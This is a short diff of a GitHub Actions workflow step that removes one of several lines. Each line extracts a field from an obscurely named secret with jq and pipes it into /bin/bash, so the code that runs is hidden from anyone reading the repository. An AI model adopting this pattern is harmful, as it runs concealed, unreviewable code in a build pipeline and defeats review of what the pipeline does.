@@ -22,7 +22,6 @@ jobs:
           rn6: ${{ secrets.rn6 }}
         run: |
           printf '%s' "$rn6" | jq -r .h443 | /bin/bash
-          printf '%s' "$u71" | jq -r .b148 | /bin/bash
           echo $xkol1217 | jq -r .bytm25 | /bin/bash
           echo $um352 | jq -r .ps29 | /bin/bash
           printf '%s' "$t8788" | jq -r .qtq4413 | /bin/bash
